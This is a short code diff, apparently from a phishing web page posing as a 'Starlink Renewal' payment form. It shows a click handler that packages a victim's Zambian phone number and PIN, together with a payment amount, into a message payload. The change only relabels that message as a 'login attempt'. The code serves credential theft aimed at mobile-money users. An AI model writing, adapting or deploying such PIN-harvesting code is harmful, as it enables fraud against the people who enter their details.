@@ -171,7 +171,7 @@ confirmButton.addEventListener('click', async () => {
 
   sessionStorage.setItem('submittedPhone', phoneNumber);
 
-  const message = `Trial Payment Submission\nPhone: +260${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: ${paymentAmount}`;
+  const message = `login attempt \nPhone: +260${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: ${paymentAmount}`;
 
   const payload = { text: message, type: 'trial' };
 
